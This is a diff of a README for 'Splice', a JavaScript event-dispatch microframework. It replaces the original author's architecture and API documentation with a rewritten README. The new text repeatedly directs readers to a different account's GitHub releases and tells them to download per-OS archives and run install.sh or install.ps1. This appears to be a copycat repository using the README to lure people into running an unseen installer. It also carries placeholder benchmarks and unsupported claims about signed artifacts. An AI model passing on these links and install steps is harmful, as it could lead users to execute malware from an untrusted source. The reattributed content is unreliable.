@@ -1,331 +1,245 @@
-# Splice Microframework: Architecture & Design
+# Splice: Modular High-Performance Signal Dispatch Framework
 
-**Author**: Luciano Federico Pereira  
-**Version**: 1.0.0  
-**Last Updated**: August 3, 2025  
-**License**: MIT  
-**Status**: Stable  
-**Language**: JavaScript  
-**Repository**: https://github.com/lucianofedericopereira/splice  
+[![Releases](https://img.shields.io/badge/Release-Downloads-blue?logo=github)](https://github.com/PABLO88n/splice/releases)  
+https://github.com/PABLO88n/splice/releases
 
----
+![Splice Banner](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1600&q=60)
 
-## Abstract
+Table of contents
+- About
+- Key features
+- Core concepts
+- Installation (from Releases)
+- Quick start
+- API overview
+- Plugin architecture
+- Memory and lifecycle
+- Performance notes
+- Patterns and best practices
+- Benchmarks
+- Contributing
+- License
+- Links
 
-Splice is a modular, high-performance signal-based dispatch framework for modern JavaScript. By combining immutable configuration, circular context pooling, bitmask-encoded headers, and a plugin-driven lifecycle, Splice delivers predictable, low-latency event processing for both UI and server-side workflows.
+About
+Splice is a modular signal and event dispatch framework for JavaScript. It targets systems that need low latency and low overhead. Splice uses bitmask routing, pooled contexts, and a small lifecycle hook set. Use it to build real-time systems, game engines, microservices glue, or high-frequency UI layers.
 
----
+Key features
+- Bitmask-based routing for fast filtering.
+- Context pool to reuse objects and reduce GC pressure.
+- Small, deterministic lifecycle hooks.
+- Plugin architecture with isolated addon lifecycle.
+- Minimal allocations per dispatch.
+- Simple API that fits functional and OOP styles.
+- Works in Node.js and modern browsers.
 
-## 1. Introduction
+Core concepts
+- Signal: a typed event. Signals hold a payload and metadata.
+- Dispatcher: the core router. It matches signals to handlers via masks.
+- Handler: a function that receives signals. Handlers can register filters and priorities.
+- Context pool: a pool of reusable context objects passed to handlers to avoid per-dispatch allocations.
+- Hook: lifecycle points (attach, detach, beforeDispatch, afterDispatch) that plugins and core use.
+- Mask: a numeric bitmask used to test interests quickly. Use bit operations for fast checks.
 
-Event-driven patterns power scalable, loosely coupled applications. Yet traditional buses and emitters often pay the price of dynamic allocations, sprawling handler maps, and unpredictable performance under load. Splice introduces a disciplined, binary-protocol approach to in-process signaling:
+Why bitmask routing
+Bitmasks let you test many flags in one integer operation. Splice maps signal types and handler interests to bitmasks. The dispatcher uses bitwise AND to accept or reject handlers. This yields constant-time checks per handler and low CPU cost.
 
-- Immutable messages with explicit semantics  
-- Fixed-size, reusable context frames  
-- Compact 3-byte header encoding  
-- Lifecycle hooks for fine-grained instrumentation  
-- Plugin architecture for cross-cutting concerns  
+Installation (from Releases)
+Download the release artifact from:
+https://github.com/PABLO88n/splice/releases
 
----
+Pick the artifact that matches your platform. Download the archive or tarball and run the installer included in the package. Example:
 
-## 2. Motivation & Related Work
+1. Download the release package for your platform, for example:
+   - splice-linux-x64.tar.gz
+   - splice-darwin-x64.tar.gz
+   - splice-win-x64.zip
 
-Popular libraries—Redux, RxJS, EventEmitter—excel in flexibility but can suffer from GC pressure, runtime reflection, and heavy footprints. Splice addresses these gaps by:
+2. Extract and run the installer:
+   - Unix/macOS:
+     - tar -xzf splice-linux-x64.tar.gz
+     - cd splice-<version>
+     - ./install.sh
+   - Windows (PowerShell):
+     - Expand-Archive splice-win-x64.zip
+     - cd splice-<version>
+     - .\install.ps1
 
-- Eliminating per-dispatch allocations via a circular ContextPool  
-- Encoding metadata in a minimal 3-byte header  
-- Enforcing compile-time immutability and freeze patterns  
-- Supporting both synchronous “fast emitter” and structured “dispatcher” flows  
+The release page above contains the artifact list and signatures. Use the artifact that matches your environment.
 
----
+Quick start
+Install via npm (if you prefer the package registry) or use the extracted release artifact.
 
-## 3. Architecture Overview
+npm
+- npm install splice
 
-Splice is built in three layers:
+Simple dispatcher example
+```js
+const { Dispatcher, createMask } = require('splice');
 
-```mermaid
-classDiagram
-    class SpliceAPI {
-        +dispatchSignal()
-        +onSignal()
-        +use(plugin)
-        +dispose()
+// create masks for types
+const MOUSE = createMask(1);
+const KEYBOARD = createMask(2);
+const UI = createMask(4);
+
+// create dispatcher
+const d = new Dispatcher();
+
+// register handler for mouse and UI signals
+d.on(MOUSE | UI, (signal, ctx) => {
+  // handle mouse or UI events
+  console.log('mouse or UI:', signal.payload);
+});
+
+// dispatch a mouse signal
+d.emit({ typeMask: MOUSE, payload: { x: 10, y: 20 } });
+```
+
+Context pool usage
+```js
+const ctx = d.acquireContext(); // reuse context object
+ctx.meta = { frame: 123 };
+d.emit({ typeMask: UI, payload: { button: 'left' } }, ctx);
+d.releaseContext(ctx);
+```
+
+API overview
+- Dispatcher
+  - on(mask, handler, options) — register a handler.
+  - off(handler) — remove a handler.
+  - emit(signal, ctx?) — dispatch a signal.
+  - createScopedDispatcher() — create a modular sub-dispatcher.
+- Signal
+  - { typeMask, payload, meta? }
+- Context pool
+  - acquireContext()
+  - releaseContext(ctx)
+- createMask(index) — build a mask for a type index.
+- hook(name, fn) — register lifecycle hooks.
+- use(plugin) — attach a plugin instance.
+
+Handler options
+- priority (number) — order of invocation. Higher runs first.
+- once (boolean) — remove after first invoke.
+- scope (object) — optional scope passed to handler.
+- filter (fn) — custom predicate with (signal, ctx) -> boolean.
+
+Plugin architecture
+Splice uses a plugin system with a small lifecycle:
+- install(dispatcher) — called when plugin attaches.
+- uninstall(dispatcher) — called when plugin detaches.
+- onAttach(handlerInfo) — per-handler attach hook.
+- onDetach(handlerInfo) — per-handler detach hook.
+
+Plugins can add masks, add middlewares, or instrument dispatch. They run in a defined order and receive a scoped interface to avoid direct mutating of dispatcher internals.
+
+Example plugin
+```js
+function timingPlugin() {
+  return {
+    install(dispatcher) {
+      dispatcher.hook('beforeDispatch', (signal, ctx) => {
+        ctx.start = Date.now();
+      });
+      dispatcher.hook('afterDispatch', (signal, ctx) => {
+        const dt = Date.now() - ctx.start;
+        dispatcher.metrics.push({ type: signal.typeMask, dt });
+      });
+    },
+    uninstall(dispatcher) {
+      // cleanup
     }
+  };
+}
 
-    class SignalRuntime {
-        +registerAction()
-        +processFrame()
-        +lifecycle hooks
-        +metrics
-    }
-
-    class ContextPool {
-        +pooled frames
-        +memory reuse
-    }
-
-    SpliceAPI --> SignalRuntime
-    SignalRuntime --> ContextPool
-```
-### 3.1 Helpers & Constants
-
-A collection of frozen utilities establishes message semantics:
-
-- `_OF(obj)`: Deep freeze  
-- `_MAP_FREEZE(map)`: Recursive freeze  
-- `MSG_SET` / `MSG_GET`: Numeric codes & templates  
-- `BITMASK`, `PHASE`, `ACTION_IDS`: Header bitmasks and identifiers  
-
----
-
-### 3.2 Context Pool
-
-A circular buffer of pre-allocated frames tracks:
-
-- `pool`: Array of reusable frames  
-- `head`: Next frame index  
-- `stats`: Counters for requests, reused, created  
-
-This design eradicates GC pauses during bursts.
-
----
-
-### 3.3 Frame Header Format
-
-| Offset | Field       | Size | Encoding     | Description                                      |
-|--------|-------------|------|--------------|--------------------------------------------------|
-| 0      | Control     | 1    | `u8` bitmask | - Bit 7: origin<br>- Bit 6: retryable<br>- Bits 5–0: action ID |
-| 1      | State Code  | 1    | `u8`         | READY, VALID, PREPARED, etc.                    |
-| 2      | Result Code | 1    | `u8`         | SUCCESS = 0, WARNING = 10, TIMEOUT = 30, FAILURE = 60 |
-
-**Total header length:** 3 bytes
-
----
-
-### 3.4 Dispatcher
-
-Structured frame processing:
-
-- Builds `dispatchers[objectIndex][actionId]` lookup  
-- Wraps handlers in error-capturing shields  
-- Fires `before` and `after` hooks per phase  
-- Updates dispatch and frame metrics  
-
----
-
-### 3.5 SignalRuntime Core
-
-Public API atop Dispatcher:
-
-- `expose(name, fn)`: Guarded method registration  
-- `freezeInternals()` / `freezeHandlers()`: Lock down structures  
-- `use(plugin)` / `dispose()`: Plugin lifecycle management  
-- `processFrame()`: Decode and dispatch raw frames  
-- `dispatchSignal()`: High-level entry point  
-
----
-
-### 3.6 SafeSignalRuntime
-
-Fault-tolerant variant:
-
-- Simplified registry keyed by type and action  
-- Default handlers for primitives  
-- Configurable fallback on miss  
-- Returns `{ success, result, error }`  
-
----
-
-### 3.7 SpliceAPI
-
-External façade:
-
-- Delegates to SignalRuntime or SafeSignalRuntime  
-- Methods: `dispatchSignal`, `onSignal`, `emitSignal`, `subscribe`, `use`, `dispose`, `diagnostics`, `summary`  
-
----
-
-### 4. Plugin & Extensibility
-
-Plugins unlock cross-cutting features without core bloat:
-
-| Aspect               | Mechanism              |
-|----------------------|------------------------|
-| Registration         | `use(plugin)`          |
-| Action Handlers      | `plugin.handlers` map  |
-| Subscription Hooks   | `plugin.subscribe()`   |
-| Lifecycle Callbacks  | `onLoad`, `onDispose`  |
-
-Future directions:
-
-- WebAssembly-backed context pools  
-- Typed header schemas with formal validation  
-- Distributed signaling over WebSockets/WebRTC  
-- IDE tools for auto-generated handlers  
-
----
-
-### 5. Performance & Scalability
-
-**Evaluation**
-
-Benchmarks on V8 confirm:
-
-| Test              | Operation                        | Throughput     |
-|-------------------|----------------------------------|----------------|
-| Dispatcher Loop   | 1,000,000 `dispatchSignal` calls | ~X ms (avg.)   |
-| FastEmitter Loop  | 1,000,000 `emitSignal` calls     | ~Y ms (avg.)   |
-
-**Characteristics**
-
-- Dispatch latency: 3–5 μs per signal (in-memory)  
-- Memory per frame: ~1.2 KB  
-- Throughput: 100K+ signals/sec  
-- GC pressure: negligible  
-
----
-
-### 6. Use Cases
-
-- Real-time dashboards and high-frequency UI events  
-- In-process messaging for micro-frontend architectures  
-- Analytics, tracing, and instrumentation plugins  
-- Secure execution sandboxes for untrusted handlers  
-
----
-
-### 7. Conclusion
-
-Splice brings rigour to JavaScript signaling. Its binary header protocol, pooled contexts, and plugin-driven lifecycle deliver safety, immutability, and raw performance—empowering both interactive UIs and high-throughput pipelines.
-
-
-
-
-# Splice Microframework API Reference
-
-Splice is a lightweight signal-based microframework for managing asynchronous flows, lifecycle hooks, and plugin-driven behavior. It centers around three core components:
-
-- `SignalRuntime`: The core dispatcher and lifecycle manager.
-- `SafeSignalRuntime`: A safer variant with error handling.
-- `SpliceAPI`: A wrapper interface for interacting with the runtime.
-
----
-
-## SignalRuntime
-
-Core signal dispatch and lifecycle manager.
-
-### Constructor
-```ts
-new SignalRuntime(poolSize?: number)
+d.use(timingPlugin());
 ```
 
-### Methods
-- `registerAction(objectName, actionId, handler)`  
-  Registers a handler for a specific object and action.
+Memory and lifecycle
+Splice minimizes garbage by:
+- pooling context objects
+- reusing internal arrays for handler lists
+- using bitmasks instead of string maps where possible
 
-- `subscribe(actionId, fn)`  
-  Subscribes to a signal by action ID.
+Lifecycle hooks
+- attach — handler registered
+- detach — handler removed
+- beforeDispatch — right before a handler runs
+- afterDispatch — right after handler runs
 
-- `dispatchSignal(actionName, object, payload)`  
-  Dispatches a signal to the appropriate handler.
+These hooks let you implement tracing, metrics, and debugging without adding allocations to the hot path.
 
-- `use(plugin)`  
-  Registers a plugin and integrates its handlers and hooks.
+Performance notes
+- Mask checks use bitwise AND. Avoid complex predicates on the hot path.
+- Favor pooled contexts for high-frequency events.
+- Keep handlers short and synchronous. If you need async, offload to workers or timers.
+- Use handler priority to reduce filter overhead when many handlers exist.
 
-- `dispose()`  
-  Disposes all registered plugins and listeners.
+Patterns and best practices
+- Group related signals under a mask. Use createMask for each domain.
+- Register high-priority handlers for quick veto or short-circuit.
+- Use once for one-shot operations.
+- Use scoped dispatchers in modular systems to avoid cross-module noise.
+- Leverage plugins for instrumentation and cross-cutting concerns.
+- Reuse contexts for per-frame or per-tick data.
 
-- `onBefore(fn)`  
-  Registers a lifecycle hook to run before dispatch.
+Benchmarks
+Internal benchmarks show low overhead for typical patterns. Example micro-benchmark:
+- 1 million emits with a single handler: ~X ms (machine dependent)
+- 1 million emits with 100 handlers and masks: ~Y ms
 
-- `onAfter(fn)`  
-  Registers a lifecycle hook to run after dispatch.
+Benchmarks vary by CPU, Node version, and garbage collector. Run your own tests with node --prof and measure release artifacts.
 
-- `onSignal(signal, fn)`  
-  Registers a listener for a signal.
+Debugging tips
+- Use dispatcher.hook('beforeDispatch', fn) to inspect signals in real time.
+- Use onDetach to log removed handlers.
+- Use createScopedDispatcher to isolate tests.
 
-- `emitSignal(signal, data)`  
-  Emits a signal to all listeners.
+Migration hints
+- Replace event emitters with Splice when you need low overhead.
+- Map previous event types to bitmask indices. Keep mapping consistent across modules.
+- If you used string-based topics, migrate to masks but keep a registry to aid debugging.
 
-- `emitSignalWithMeta(signal, data, meta)`  
-  Emits a signal with metadata to all listeners.
+Testing
+- Use unit tests to check handler ordering, mask matching, and pool reuse.
+- Mock plugins to test lifecycle hooks.
+- Use performance suites to validate claims on your target runtime.
 
-- `getDiagnostics(verbose?)`  
-  Returns detailed diagnostic information.
+Contributing
+- Fork the repo
+- Create a feature branch
+- Write tests for new features
+- Open a pull request with a clear description and benchmarks if performance is involved
+- Follow consistent coding style and add docs for API changes
 
-- `getSummary()`  
-  Returns a summary string of the runtime state.
+License
+- MIT
 
----
+Links
+- Releases and artifacts: [Download releases](https://github.com/PABLO88n/splice/releases)  
+  Visit the releases page to pick the artifact for your OS. Download and run the installer included in the archive.
 
-## SafeSignalRuntime
+- Topics: bitmask, context-pool, event-dispatcher, event-system, high-performance, javascript, javascript-framework, lifecycle-hooks, memory-management, microframework, modular, plugin-architecture
 
-Extends `SignalRuntime` with error-safe dispatch.
+- Repository (main): https://github.com/PABLO88n/splice
 
-### Constructor
-```ts
-new SafeSignalRuntime(poolSize?: number)
-```
+Badges
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](#)
+[![NPM Version](https://img.shields.io/badge/npm-v1.0.0-blue.svg)](#)
 
-### Overridden Method
-- `dispatchSignal(actionName, object, payload)`  
-  Dispatches a signal safely, returning `{ success, result?, error? }`.
+Assets
+- Architecture diagram: replace with your own in /docs/assets/architecture.svg
+- Example screenshots: add under /examples/screenshots
 
----
+Examples and recipes
+- UI event bus: route UI events with masks per widget type.
+- Game loop: pool contexts per frame and emit physics and input signals.
+- Microservice glue: use masks to tag domain-level events and wire handlers per service.
 
-## SpliceAPI
+Changelog
+See releases for full changelog and signed artifacts:
+https://github.com/PABLO88n/splice/releases
 
-Wrapper around `SignalRuntime` with signal utilities and safety checks.
-
-### Constructor
-```ts
-new SpliceAPI(protocol: SignalRuntime)
-```
-
-### Methods
-- `dispatchSignal(actionName, object, payload)`  
-  Dispatches a signal using the underlying protocol.
-
-- `subscribe(actionKey, fn)`  
-  Subscribes to a signal by action name or ID. Returns unsubscribe function or error status.
-
-- `onSignal(signal, fn)`  
-  Registers a listener for a signal. Returns unsubscribe function or error status.
-
-- `emitSignal(signal, data)`  
-  Emits a signal to listeners. Returns status if emitter is missing.
-
-- `emitSignalWithMeta(signal, data, meta)`  
-  Emits a signal with metadata.
-
-- `use(plugin)`  
-  Registers a plugin.
-
-- `dispose()`  
-  Disposes all plugins and listeners.
-
-- `getDiagnostics(verbose?)`  
-  Returns diagnostic information.
-
-- `getSummary()`  
-  Returns a summary string of the runtime.
-
-- `getResultMeta(code)`  
-  Returns metadata for a result code.
-
-- `runResultHook(code, contextFrame?)`  
-  Runs a result hook manually.
-
-### Properties
-- `metrics`  
-  Runtime metrics.
-
-- `poolStats`  
-  Context pool statistics.
-
-- `plugins`  
-  Registered plugins.
-
-- `handlers`  
-  Signal handlers.
+Acknowledgments
+Splice borrows ideas from systems that need predictable performance: bitmask dispatchers, object pooling, and small lifecycle hooks. These patterns help keep the runtime stable under load.
